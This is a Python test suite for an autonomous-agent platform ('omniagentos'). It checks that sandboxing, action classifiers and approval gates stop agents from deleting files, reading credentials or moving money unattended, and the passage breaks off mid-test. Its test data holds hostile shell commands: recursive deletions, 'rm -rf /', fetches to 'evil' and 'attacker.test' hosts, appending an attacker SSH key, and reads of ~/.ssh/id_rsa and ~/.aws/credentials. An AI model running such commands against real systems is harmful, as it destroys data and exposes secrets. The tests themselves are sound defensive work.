"""AC-policy guardrail PROOF: the reviewer's blockers are all closed.

Each test maps to an acceptance criterion in the safety-critical guardrail brief.
Every test runs the REAL shipped AUTO-mode policy (``load_policy()``) so it proves
end-to-end behaviour, not a stub's opinion.

Blunt question this file answers: can an autonomous agent, in AUTO mode, delete an
out-of-scope file or move money WITHOUT human approval? Answer: no -- proven below.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from omniagentos.adapters.common import _scrubbed_env
from omniagentos.connectors import Capability, HttpSpec
from omniagentos.connectors.broker import HARD_HUMAN_CLASSES, BrokerDenied, authorize
from omniagentos.contracts import ActionClass, RunState
from omniagentos.db.store import SqliteStore
from omniagentos.policy.shell import classify_shell
from omniagentos.runner import sandbox
from omniagentos.runner.core import Runner
from omniagentos.sessions.policy_map import classify_tool
from tests.runner.test_auto_hardstop import _auto_deps, _drain, _EscalationSpy
from tests.runner.test_state_machine import (
    FinalizationSpy,
    TrackingAdapter,
    create_run,
)


def _validate_run(store: SqliteStore, command, *, workspace_base: str) -> str:
    _, run_id = create_run(
        store,
        [
            {
                "name": "attack",
                "kind": "validate",
                "action_class": ActionClass.READ_ONLY.value,  # a lie the plan tells
                "params": {"command": command, "tools_allowed": ["shell"]},
            }
        ],
        tools_allowed=["shell"],
    )
    return run_id


# ---------------------------------------------------------------- HOLE #3 + #1a
# The reviewer's four blocker repros, each as a RUNNER VALIDATE STEP, must
# hard-stop (park) and NEVER auto-execute.


def test_reviewer_blocker_repros_hard_stop_as_validate_steps(tmp_path: Path) -> None:
    victim_dir = tmp_path / "victim_dir"
    victim_dir.mkdir()
    (victim_dir / "keep").write_text("precious")
    victim_file = tmp_path / "victim_file.txt"
    victim_file.write_text("precious")
    ssh_target = tmp_path / "authorized_keys"  # stand-in for ~/.ssh/authorized_keys

    repros = [
        ["python3", "-c", f"import shutil; shutil.rmtree({str(victim_dir)!r})"],
        ["node", "-e", f"require('fs').rmSync({str(victim_dir)!r},{{recursive:true}})"],
        ["cp", "/etc/hosts", str(ssh_target)],
        ["python3", "-c", f"import os; os.remove({str(victim_file)!r})"],
    ]
    for command in repros:
        store = SqliteStore(str(tmp_path / f"db_{abs(hash(tuple(command)))}.db"))
        run_id = _validate_run(store, command, workspace_base=str(tmp_path / "ws"))
        adapter, spy, escalate = TrackingAdapter(), FinalizationSpy(), _EscalationSpy()
        runner = Runner(
            store,
            "w1",
            dependencies=_auto_deps(adapter, spy, escalate),
            workspace_base=str(tmp_path / "ws"),
        )
        _drain(runner)

        run = store.get_run(run_id)
        assert run and run["state"] == RunState.AWAITING_APPROVAL.value, command
        approval = store.get_approval_for(run_id, 0)
        assert approval and approval["action_class"] == ActionClass.IRREVERSIBLE.value, command
        assert escalate.kinds() == ["hard_stop"], command

    # nothing executed: every victim survives untouched.
    assert (victim_dir / "keep").read_text() == "precious"
    assert victim_file.read_text() == "precious"
    assert not ssh_target.exists()


# --------------------------------------------------------------------- HOLE #1
# Money boundary: payment/bank/infra creds are absent from the subprocess env, so
# a runner command cannot reach a payment API with a key; the broker still denies.


def test_payment_keys_absent_from_scrubbed_env() -> None:
    base = {
        "ACMEUNI_STRIPE_PRIMARY_SECRET_KEY": "sk_live_x",
        "SLASH_API_KEY": "slash_x",
        "OPERATOR_TOKEN": "op_x",
        "OMNIAGENTOS_OPERATOR_TOKEN": "op_real",
        "DATABASE_URL": "postgres://admin:pw@h/db",
        "PATH": "/usr/bin",
        "HOME": "/home/u",
    }
    env = _scrubbed_env(base)
    for absent in (
        "ACMEUNI_STRIPE_PRIMARY_SECRET_KEY",
        "SLASH_API_KEY",
        "OPERATOR_TOKEN",
        "OMNIAGENTOS_OPERATOR_TOKEN",
        "DATABASE_URL",
    ):
        assert absent not in env
    assert env["PATH"] == "/usr/bin" and env["HOME"] == "/home/u"


def test_runner_subprocess_has_no_payment_key(tmp_path: Path, monkeypatch) -> None:
    """Even a shell run through _run_command sees no Stripe key -> `curl $KEY` is empty."""
    monkeypatch.setenv("ACMEUNI_STRIPE_PRIMARY_SECRET_KEY", "sk_live_should_not_leak")
    ws = tmp_path / "ws"
    ws.mkdir()
    completed = Runner._run_command(
        ["/bin/sh", "-c", 'printf %s "${ACMEUNI_STRIPE_PRIMARY_SECRET_KEY-ABSENT}"'],
        cwd=str(ws),
        timeout_s=15,
        timeout_label="probe",
    )
    assert completed.stdout == "ABSENT"  # the key never reached the subprocess


def test_runner_subprocess_closes_credential_shaped_prefixes(tmp_path: Path, monkeypatch) -> None:
    """A runner subprocess receives safe XDG/session pointers, not prefix-shaped secrets."""
    monkeypatch.setenv("XDG_AUTH", "dummy-xdg-auth")
    monkeypatch.setenv("OMNIAGENTOS_BRIDGE_SESSION_AUTH", "dummy-bridge-auth")
    monkeypatch.setenv("XDG_CONFIG_HOME", "/tmp/config")
    monkeypatch.setenv("OMNIAGENTOS_BRIDGE_SESSION_ID", "abc-def-123")
    ws = tmp_path / "ws"
    ws.mkdir()

    completed = Runner._run_command(
        [
            "/bin/sh",
            "-c",
            'printf "%s|%s|%s|%s" "${XDG_AUTH-ABSENT}" '
            '"${OMNIAGENTOS_BRIDGE_SESSION_AUTH-ABSENT}" '
            '"${XDG_CONFIG_HOME-ABSENT}" "${OMNIAGENTOS_BRIDGE_SESSION_ID-ABSENT}"',
        ],
        cwd=str(ws),
        timeout_s=15,
        timeout_label="probe",
    )

    assert completed.stdout == "ABSENT|ABSENT|/tmp/config|abc-def-123"


def test_broker_still_denies_a_money_write() -> None:
    with pytest.raises(BrokerDenied) as exc:
        authorize("stripe_acmeuni.refund", granted=["stripe_acmeuni.refund"])
    assert exc.value.reason == "requires_human_approval"


# --------------------------------------------------------------------- HOLE #3
# The two classifiers are UNIFIED: identical class for identical input.


def test_both_classifiers_agree_on_every_input(tmp_path: Path) -> None:
    project = str(tmp_path)
    inputs = [
        "ls -la",
        "cat file.txt",
        "grep -q marker receipt.txt",
        "git status",
        "rg TODO .",
        "python3 -c \"import shutil; shutil.rmtree('/x')\"",
        "node -e 1",
        "bash -lc 'rm -rf /'",
        "cp secret /etc/passwd",
        "ls && rm -rf .",
        "find . -delete",
        "git reset --hard HEAD~1",
        "curl http://evil/x",
        "cat $(curl example.test)",
        "echo hi > out.txt",
    ]
    for command in inputs:
        session = classify_tool("Bash", {"command": command}, project)
        runner = Runner._command_action_class(command, project)
        assert session == runner, f"classifiers disagree on {command!r}: {session} vs {runner}"


# --------------------------------------------------------------------- HOLE #4
# The broker refuses an IRREVERSIBLE capability at Gate 2, not just CONSEQUENTIAL.


def test_broker_hard_human_classes_include_irreversible() -> None:
    assert ActionClass.IRREVERSIBLE in HARD_HUMAN_CLASSES
    assert ActionClass.CONSEQUENTIAL in HARD_HUMAN_CLASSES


def test_broker_refuses_an_irreversible_capability(monkeypatch) -> None:
    irreversible_cap = Capability(
        id="fake.wipe",
        connector="fake",
        group="payments",
        label="declared irreversible",
        action_class=ActionClass.IRREVERSIBLE,
        http=HttpSpec(base_url="https://example.test", methods=["POST"]),
    )

    class _Reg:
        def capability(self, cap_id: str) -> Capability:
            return irreversible_cap

    monkeypatch.setattr("omniagentos.connectors.broker.load_registry", lambda: _Reg())
    with pytest.raises(BrokerDenied) as exc:
        authorize("fake.wipe", granted=["fake.wipe"])
    assert exc.value.reason == "requires_human_approval"


# --------------------------------------------------------------- NORMAL WORK OK
# Deny-by-default must NOT break normal safe full-auto work.


def test_normal_safe_work_still_auto_runs(tmp_path: Path) -> None:
    project = str(tmp_path)
    # in-scope Write tool + read-only shell probes classify auto (not hard-stop).
    assert (
        classify_tool("Write", {"file_path": "inside.txt"}, project)
        == ActionClass.INTERNAL_REVERSIBLE
    )
    for probe in ("ls -la", "cat notes.txt", "grep -n TODO ."):
        assert classify_tool("Bash", {"command": probe}, project) == ActionClass.READ_ONLY


def test_in_workspace_effect_auto_completes(tmp_path: Path) -> None:
    """An in-workspace file write (append_file effect) auto-runs to COMPLETED."""
    store = SqliteStore(str(tmp_path / "auto.db"))
    _, run_id = create_run(
        store,
        [
            {
                "name": "write-in-scope",
                "kind": "effect",
                "action_class": ActionClass.INTERNAL_REVERSIBLE.value,
                "params": {
                    "effect": "append_file",
                    "path": "out.txt",
                    "line": "built",
                    "tools_allowed": ["file_write"],
                },
            }
        ],
        tools_allowed=["file_write"],
    )
    adapter, spy, escalate = TrackingAdapter(), FinalizationSpy(), _EscalationSpy()
    runner = Runner(
        store,
        "w1",
        dependencies=_auto_deps(adapter, spy, escalate),
        workspace_base=str(tmp_path / "ws"),
    )
    _drain(runner)

    run = store.get_run(run_id)
    assert run and run["state"] == RunState.COMPLETED.value
    assert store.get_approval_for(run_id, 0) is None  # no approval needed
    assert (tmp_path / "ws" / run_id / "out.txt").read_text() == "built\n"


# --------------------------------------------------------------------- HOLE #2
# OS sandbox physically blocks an out-of-workspace write/delete.


def test_os_sandbox_blocks_out_of_workspace_write(tmp_path: Path) -> None:
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec not available/proven on this host; classifier is the guarantee")
    workspace = tmp_path / "ws"
    workspace.mkdir()
    victim = tmp_path / "home_like" / "authorized_keys"
    victim.parent.mkdir()
    victim.write_text("precious")

    import subprocess

    profile = sandbox.build_profile(str(workspace))
    # out-of-workspace write is physically denied
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo pwned > {victim}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert victim.read_text() == "precious"  # never overwritten
    # out-of-workspace delete is physically denied
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/rm", "-f", str(victim)],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert victim.exists()  # never deleted
    # in-workspace write still works (full-auto normal work is preserved)
    keeper = os.path.realpath(str(workspace)) + "/built.txt"
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo ok > {keeper}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert Path(keeper).read_text() == "ok\n"


def test_read_only_profile_excludes_workspace_write_root(tmp_path: Path) -> None:
    """F2 (reviewer write-capability): ``workspace_writable=False`` builds a
    profile whose workspace is NOT a write root — only the passed CLI
    state/config roots are. Default (True) keeps the workspace root."""
    workspace = tmp_path / "ws"
    workspace.mkdir()
    state = tmp_path / "cli-state"
    state.mkdir()
    ws_subpath = f'(subpath "{os.path.realpath(str(workspace))}")'
    state_subpath = f'(subpath "{os.path.realpath(str(state))}")'

    read_only = sandbox.build_profile(str(workspace), [str(state)], workspace_writable=False)
    assert ws_subpath not in read_only
    assert state_subpath in read_only

    default = sandbox.build_profile(str(workspace), [str(state)])
    assert ws_subpath in default
    assert state_subpath in default


def test_read_only_profile_physically_blocks_workspace_write(tmp_path: Path) -> None:
    """Live sandbox-exec proof: under the workspace_writable=False profile a
    write INTO the workspace is denied while the CLI state root stays usable."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec not available/proven on this host")
    import subprocess

    workspace = tmp_path / "ws"
    workspace.mkdir()
    state = tmp_path / "cli-state"
    state.mkdir()
    profile = sandbox.build_profile(str(workspace), [str(state)], workspace_writable=False)
    victim = os.path.realpath(str(workspace)) + "/planted.txt"
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo x > {victim}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert not os.path.exists(victim)  # reviewer stays read-only in the workspace
    keeper = os.path.realpath(str(state)) + "/state.txt"
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo x > {keeper}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert Path(keeper).read_text() == "x\n"  # CLI state root still writable


def test_run_command_is_wrapped_when_sandbox_available(tmp_path: Path) -> None:
    """The runner's own command execution is actually routed through the sandbox."""
    ws = tmp_path / "ws"
    ws.mkdir()
    wrapped = sandbox.wrap_command(["/bin/echo", "hi"], str(ws))
    if sandbox.sandbox_available():
        assert wrapped[0] == "/usr/bin/sandbox-exec"
    else:
        assert wrapped == ["/bin/echo", "hi"]


# --------------------------------------------------- HOLE fix2 #B1/#B2/#B3
# The four file-write bypasses the re-review found now HARD-STOP via classify_shell.


_FILE_WRITE_EXPLOITS = [
    "sort -o /etc/pwned payload",  # B1: sort -o writes
    "uniq in.txt /etc/pwned",  # B1: uniq 2nd operand writes
    "echo ssh-rsa AAAA attacker &> /etc/pwned",  # B2: &> truncate bypass
    "echo ssh-rsa AAAA attacker >> /etc/pwned",  # B2: >> append attack
    "cp payload ../../../../../../etc/pwned",  # B3: relative escape
]


@pytest.mark.parametrize("command", _FILE_WRITE_EXPLOITS)
def test_file_write_bypasses_classify_irreversible(command: str, tmp_path: Path) -> None:
    project = str(tmp_path)
    assert classify_shell(command, project) == ActionClass.IRREVERSIBLE
    # both gates agree
    assert classify_tool("Bash", {"command": command}, project) == ActionClass.IRREVERSIBLE
    assert Runner._command_action_class(command, project) == ActionClass.IRREVERSIBLE


@pytest.mark.parametrize(
    "command",
    [
        "sort payload",  # bare sort: read-only, auto
        "uniq -c payload",  # bare uniq: read-only, auto
        "grep x f 2>&1",  # fd-dup redirect: read-only, auto
        "sort -o out.txt payload",  # in-scope output: auto write
    ],
)
def test_safe_sort_uniq_and_fddup_still_auto_run(command: str, tmp_path: Path) -> None:
    cls = classify_shell(command, str(tmp_path))
    assert cls in {ActionClass.READ_ONLY, ActionClass.INTERNAL_REVERSIBLE}


def test_file_write_exploit_hard_stops_as_validate_step(tmp_path: Path) -> None:
    """A `sort -o <out-of-scope>` runner validate step parks; the victim is untouched."""
    victim = tmp_path / "outside" / "authorized_keys"
    victim.parent.mkdir()
    victim.write_text("precious")
    store = SqliteStore(str(tmp_path / "b1.db"))
    run_id = _validate_run(
        store, ["sort", "-o", str(victim), "/etc/hosts"], workspace_base=str(tmp_path / "ws")
    )
    adapter, spy, escalate = TrackingAdapter(), FinalizationSpy(), _EscalationSpy()
    runner = Runner(
        store,
        "w1",
        dependencies=_auto_deps(adapter, spy, escalate),
        workspace_base=str(tmp_path / "ws"),
    )
    _drain(runner)
    run = store.get_run(run_id)
    assert run and run["state"] == RunState.AWAITING_APPROVAL.value
    approval = store.get_approval_for(run_id, 0)
    assert approval and approval["action_class"] == ActionClass.IRREVERSIBLE.value
    assert victim.read_text() == "precious"  # sort never ran


# ---------------------------------------------------------------- HOLE fix2 #B4
# The bridged session launch is OS-sandbox confined to project + CLI state dirs.


def test_session_launch_is_sandbox_confined(tmp_path: Path) -> None:
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable; session path relies on classify_shell alone")
    project = tmp_path / "project"
    project.mkdir()
    victim = tmp_path / "home_like" / ".ssh" / "authorized_keys"
    victim.parent.mkdir(parents=True)
    victim.write_text("precious")

    import subprocess

    profile = sandbox.build_profile(str(project), sandbox.session_write_roots(str(project)))
    # A session command cannot overwrite a HOME-like ~/.ssh file...
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo pwned >> {victim}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert victim.read_text() == "precious"
    # ...but CAN write inside its own project dir (session work is preserved).
    keeper = os.path.realpath(str(project)) + "/out.txt"
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo ok > {keeper}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert Path(keeper).read_text() == "ok\n"


def test_session_supervisor_launch_wraps_argv(tmp_path: Path, monkeypatch) -> None:
    """The supervisor's real launch path routes the Claude argv through the sandbox."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable on this host")
    from omniagentos.sessions import hook_token
    from omniagentos.sessions import supervisor as sup

    monkeypatch.setattr(hook_token, "HOOK_TOKENS_ROOT", tmp_path / "hook-tokens")
    captured: list[list[str]] = []

    class _P:
        pid = 4321
        stdout = None

        def poll(self) -> int | None:
            return 0

    def factory(argv, **kwargs):
        captured.append(argv)
        return _P()

    s = sup.SessionSupervisor(db_path=str(tmp_path / "s.db"), process_factory=factory)
    project = tmp_path / "proj"
    project.mkdir()
    try:
        s._launch(  # type: ignore[attr-defined]
            "sess-1",
            ["claude", "-p", "do work"],
            cwd=str(project),
            expected=sup.SessionState.STARTING,
            resumed=False,
        )
    except Exception:
        pass  # state plumbing may reject the fake; we only assert the argv wrap
    assert captured, "launch did not spawn"
    assert captured[0][0] == "/usr/bin/sandbox-exec"
    assert "claude" in captured[0]


# ========================= AC-policy hook-auth ===============================
# A sandboxed session cannot read var/secrets/sessions-token, so the PreToolUse
# hook authenticates to hook-eval with a per-session credential instead
# (sessions.hook_token). It must be denied-by-default like a secret dir and
# re-opened ONLY in the profile of the session it belongs to.


def test_hook_token_dir_denied_by_default_and_reopened_only_for_its_owner() -> None:
    """Python-level proof (runs even without a live sandbox-exec): the hook-token
    store is deny-read by default, and build_profile emits a literal re-allow ONLY
    for the exact file passed via extra_read_allow -- never the whole directory."""
    bare_profile = sandbox.build_profile("/tmp")
    assert "deny file-read*" in bare_profile
    assert sandbox.hook_token_read_deny_root() in bare_profile

    owned = sandbox.session_hook_token_read_allow("ses_owner")
    profile_with_allow = sandbox.build_profile("/tmp", extra_read_allow=owned)
    assert f'(allow file-read* (literal "{owned[0]}"))' in profile_with_allow
    # A sibling id's file is never mentioned -- nothing re-opens it.
    sibling = sandbox.session_hook_token_read_allow("ses_sibling")[0]
    assert sibling not in profile_with_allow


def test_sandbox_denies_a_sibling_sessions_hook_token_but_allows_its_own(
    tmp_path: Path, monkeypatch
) -> None:
    """Live proof: the owning session's profile CAN read its own hook-eval
    credential; that SAME profile CANNOT read a sibling session's credential
    (denied-by-default wins for everyone except the one file re-opened); and a
    profile with no re-allow at all (e.g. a non-session sandboxed command) can
    read neither -- even though hook-token file paths are otherwise on-disk
    filenames like any other, and reads are `(allow default)` everywhere else.
    """
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable")
    from omniagentos.sessions import hook_token

    monkeypatch.setattr(hook_token, "HOOK_TOKENS_ROOT", tmp_path / "hook-tokens")
    owner_token = hook_token.issue_hook_token("ses_owner")
    hook_token.issue_hook_token("ses_sibling")

    workspace = tmp_path / "ws"
    workspace.mkdir()
    import subprocess

    owner_profile = sandbox.build_profile(
        str(workspace), extra_read_allow=sandbox.session_hook_token_read_allow("ses_owner")
    )
    owner_read = subprocess.run(
        [
            "/usr/bin/sandbox-exec",
            "-p",
            owner_profile,
            "/bin/cat",
            str(hook_token.hook_token_path("ses_owner")),
        ],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert owner_read.stdout == owner_token  # its OWN credential is readable

    sibling_read = subprocess.run(
        [
            "/usr/bin/sandbox-exec",
            "-p",
            owner_profile,
            "/bin/cat",
            str(hook_token.hook_token_path("ses_sibling")),
        ],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert sibling_read.stdout == ""  # a SIBLING's credential never leaks

    bare_profile = sandbox.build_profile(str(workspace))  # no extra_read_allow at all
    bare_read = subprocess.run(
        [
            "/usr/bin/sandbox-exec",
            "-p",
            bare_profile,
            "/bin/cat",
            str(hook_token.hook_token_path("ses_owner")),
        ],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert bare_read.stdout == ""  # deny-by-default holds with no re-allow at all


# ============================ AC-policy fix3 ================================
# #B1 adapter path, #B2 secret-file read + auto egress, functional claude-tmp fix.


def test_kimi_refused_for_any_unattended_step() -> None:
    """A force-auto CLI (kimi) may NOT run ANY unattended step (fix4 BLOCKER 2).

    kimi force-auto-approves every tool call and cannot honor any sandbox level, so
    both read_only AND workspace_write are refused unless a human elevates it."""
    from omniagentos.adapters.kimi import KimiAdapter
    from omniagentos.contracts import AgentInput, BudgetSpec, ResultStatus

    def _input(level: str, **meta) -> AgentInput:
        return AgentInput(
            run_id="r",
            task_id="t",
            prompt="p",
            working_dir=".",
            model=None,
            budget=BudgetSpec(wall_ms_max=1000),
            metadata={"sandbox": {"level": level}, **meta},
        )

    # BOTH levels are refused for the force-auto CLI, not just workspace_write.
    for level in ("read_only", "workspace_write"):
        result = KimiAdapter().run(_input(level))
        assert result.status is ResultStatus.ERROR, level
        assert "unattended_forceauto_refused:cli-kimi" in (result.error or ""), level
    # explicit human elevation lifts the floor (checked without spawning a CLI):
    # either the legacy or the general elevation flag lets the launch proceed.
    for flag in ("cli_workspace_write_elevated", "cli_unattended_elevated"):
        assert (
            KimiAdapter()._refuse_unattended_launch(_input("read_only", **{flag: True})) is None
        ), flag


def test_non_forceauto_adapter_not_refused_for_workspace_write() -> None:
    """A CLI that honors the read-only sandbox level is not gated by the kimi floor."""
    from omniagentos.adapters.common import CliAdapter

    assert CliAdapter.honors_read_only_sandbox is True
    from omniagentos.adapters.claude import ClaudeAdapter

    assert ClaudeAdapter.honors_read_only_sandbox is True


def test_adapter_subprocess_write_confinement(tmp_path: Path) -> None:
    """The adapter sub-CLI profile blocks an out-of-scope write/delete."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable; adapter path relies on classify + keyless env")
    workdir = tmp_path / "work"
    workdir.mkdir()
    victim = tmp_path / "home_like" / "authorized_keys"
    victim.parent.mkdir()
    victim.write_text("precious")
    import subprocess

    profile = sandbox.build_profile(str(workdir), sandbox.adapter_write_roots())
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/rm", "-f", str(victim)],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert victim.exists()  # kimi/gemini can't delete an out-of-scope file
    keeper = os.path.realpath(str(workdir)) + "/built.txt"
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo ok > {keeper}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert Path(keeper).read_text() == "ok\n"  # in-workspace agent work still works


def test_secret_file_read_hard_stops_in_classifier(tmp_path: Path) -> None:
    """#B2b: reading a known credential store classifies IRREVERSIBLE (both gates)."""
    project = str(tmp_path)
    for command in (
        "cat ~/.config/omni/connections.env",
        f"cat {os.path.expanduser('~')}/.config/omni/connections.env",
        "cat ~/.ssh/id_rsa",
        "grep key ~/.aws/credentials",
        "cat /etc/ssl/private/server.pem",  # OUT-OF-PROJECT .pem still hard-stops
        "head var/secrets/db.txt",
    ):
        assert classify_shell(command, project) == ActionClass.IRREVERSIBLE, command
        assert classify_tool("Bash", {"command": command}, project) == ActionClass.IRREVERSIBLE
    # a normal project read still auto-runs
    assert classify_shell("cat README.md", project) == ActionClass.READ_ONLY
    # fix4 LOW: an IN-SCOPE .pem is routine project material, NOT a hard-stop.
    assert classify_shell("cat server.pem", project) == ActionClass.READ_ONLY
    assert classify_tool("Read", {"file_path": "./fullchain.pem"}, project) == ActionClass.READ_ONLY


def test_sandbox_denies_secret_file_read() -> None:
    """#B2a: every sandbox profile deny-reads the omni secrets dir (broker uses env)."""
    if not sandbox.sandbox_available():
        pytest.skip(
            "sandbox-exec unavailable on this host (macOS Seatbelt only); Linux has no "
            "OS-level sandbox proof for secret-read denial here -- adapters fail closed "
            "instead when the sandbox cannot be proven (see runner/sandbox.py docstring)"
        )
    import subprocess

    roots = sandbox.secret_read_deny_roots()
    assert any(r.endswith("/.config/omni") for r in roots)
    profile = sandbox.build_profile("/tmp")
    assert "deny file-read*" in profile and roots[0] in profile
    # Prove the SBPL deny-read mechanism blocks a read of a denied dir.
    import tempfile

    with tempfile.TemporaryDirectory() as base:
        secret_dir = os.path.join(os.path.realpath(base), "secretdir")
        os.mkdir(secret_dir)
        secret_file = os.path.join(secret_dir, "connections.env")
        with open(secret_file, "w") as fh:
            fh.write("ACMEUNI_STRIPE_PRIMARY_SECRET_KEY=sk_live_x")
        adhoc = f'(version 1)\n(allow default)\n(deny file-read* (subpath "{secret_dir}"))\n'
        proc = subprocess.run(
            ["/usr/bin/sandbox-exec", "-p", adhoc, "/bin/cat", secret_file],
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert "sk_live_x" not in proc.stdout  # the secret never reached the subprocess


def test_home_dotfile_read_allowlist_keeps_runtime_grants_narrow() -> None:
    """fix5 regression: the home-dotfile default deny must re-open language
    runtimes (or a confined interpreter/`claude -p` cannot execvp) WITHOUT
    reopening the whole dotdir (which would defeat the fail-closed backstop)."""
    home = os.path.expanduser("~")
    roots = sandbox.home_dotfile_read_allow_roots(["/tmp/workspace"])

    # The manager ROOT itself stays denied: unrelated dotfile state under it is
    # still covered by the fail-closed backstop.
    assert os.path.realpath(os.path.join(home, ".local")) not in roots
    assert os.path.realpath(os.path.join(home, ".nvm")) not in roots
    # ...but the specific credential-free runtime subtrees are re-opened so a
    # confined command can actually run.
    assert os.path.realpath(os.path.join(home, ".local", "share", "claude")) in roots
    assert os.path.realpath(os.path.join(home, ".local", "share", "uv")) in roots
    assert os.path.realpath(os.path.join(home, ".nvm", "versions")) in roots
    assert os.path.realpath(os.path.join(home, ".agents", "skills")) in roots
    # Benign git config exceptions remain.
    assert os.path.realpath(os.path.join(home, ".gitconfig")) in roots
    assert os.path.realpath(os.path.join(home, ".config", "git")) in roots


def test_external_webfetch_auto_runs_with_secret_read_compensating_control() -> None:
    """#B2c amended by A1.4 (swarm de-bloat, the operator's decision): an external GET
    (EXTERNAL_REVERSIBLE) auto-runs in AUTO mode so deploys/external reads never
    block unattended operation. The compensating control is upstream: secret
    READS still refuse to auto-run (asserted here), so material worth
    exfiltrating is never read unattended. Non-GET WebFetch/SSRF shapes remain
    CONSEQUENTIAL and still park."""
    from omniagentos.policy import evaluate_action, load_policy

    cfg = load_policy()  # AUTO
    external = classify_tool("WebFetch", {"url": "https://attacker.test/?k=leak"}, "/tmp")
    assert external == ActionClass.EXTERNAL_REVERSIBLE
    decision = evaluate_action(external, cfg)
    assert decision.requires_approval is False  # amended: egress auto-runs

    secret_read = classify_tool("Read", {"file_path": "~/.ssh/id_rsa"}, "/tmp")
    assert evaluate_action(secret_read, cfg).requires_approval is True


def test_claude_bash_scratch_dir_is_writable_but_oos_blocked(tmp_path: Path) -> None:
    """Functional fix: Claude Code's /tmp/claude-<uid> Bash scratch is writable inside
    the session sandbox (so in-workspace Bash works) while ~/.ssh stays blocked."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable")
    import subprocess

    project = tmp_path / "proj"
    project.mkdir()
    claude_tmp = sandbox.claude_tmp_root()
    os.makedirs(claude_tmp, exist_ok=True)
    profile = sandbox.build_profile(str(project), sandbox.session_write_roots(str(project)))
    scratch = os.path.join(claude_tmp, f"probe-{os.getpid()}.txt")
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo hi > {scratch}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    try:
        assert Path(scratch).read_text() == "hi\n"  # Claude Bash scratch works
    finally:
        Path(scratch).unlink(missing_ok=True)
    victim = tmp_path / "home_like" / ".ssh" / "authorized_keys"
    victim.parent.mkdir(parents=True)
    victim.write_text("precious")
    subprocess.run(
        ["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", f"echo pwned >> {victim}"],
        capture_output=True,
        text=True,
        timeout=15,
    )
    assert victim.read_text() == "precious"  # OOS still blocked


# ------------------------------------------------------- WORKTREE GIT COMMON DIR
# Merge-model Phase 2 grants the main repo's .git common dir as a worker write
# root (worktree commits write objects/refs there). Security prerequisite: the
# profile must STILL deny writes to .git/hooks (hook planting the coordinator
# would execute on merge/checkout) and .git/config (core.hooksPath rewrite).


def _fake_git_common_dir(tmp_path: Path) -> Path:
    git_dir = tmp_path / "repo" / ".git"
    (git_dir / "objects").mkdir(parents=True)
    (git_dir / "hooks").mkdir()
    (git_dir / "refs" / "heads").mkdir(parents=True)
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (git_dir / "config").write_text("[core]\n\trepositoryformatversion = 0\n")
    return git_dir


def test_git_common_dir_write_root_denies_hooks_and_config_in_profile(
    tmp_path: Path,
) -> None:
    """A profile granting a git dir as a write root must carry the config
    literal + hooks subpath denies (they are emitted AFTER the allow, so SBPL
    last-match makes them win)."""
    git_dir = _fake_git_common_dir(tmp_path)
    workspace = tmp_path / "wt"
    workspace.mkdir()

    literals, subpaths = sandbox.project_config_write_deny_targets([str(git_dir)])
    assert os.path.realpath(str(git_dir / "config")) in literals
    assert os.path.realpath(str(git_dir / "hooks")) in subpaths

    profile = sandbox.build_profile(str(workspace), [str(git_dir)])
    config_deny = f'(deny file-write* (literal "{os.path.realpath(str(git_dir / "config"))}"))'
    hooks_deny = f'(deny file-write* (subpath "{os.path.realpath(str(git_dir / "hooks"))}"))'
    assert config_deny in profile
    assert hooks_deny in profile
    # The deny lines follow the write allow (last match wins in SBPL).
    assert profile.index(config_deny) > profile.index("(allow file-write*")

    # A bare `.git`-named root is covered by name even without the marker files.
    bare = tmp_path / "elsewhere" / ".git"
    bare.mkdir(parents=True)
    literals2, subpaths2 = sandbox.project_config_write_deny_targets([str(bare)])
    assert os.path.realpath(str(bare / "config")) in literals2
    assert os.path.realpath(str(bare / "hooks")) in subpaths2

    # A plain workspace root gains NO git denies (Phase-1 profiles unchanged).
    literals3, subpaths3 = sandbox.project_config_write_deny_targets([str(workspace)])
    workspace_real = os.path.realpath(str(workspace))
    assert os.path.join(workspace_real, "config") not in literals3
    assert os.path.join(workspace_real, "hooks") not in subpaths3


def test_git_common_dir_write_root_physically_blocks_hook_planting(
    tmp_path: Path,
) -> None:
    """Live sandbox-exec proof: with the git common dir granted, objects/refs
    stay writable (worker commits work) while hooks/ and config are denied."""
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec not available/proven on this host")
    import subprocess

    git_dir = _fake_git_common_dir(tmp_path)
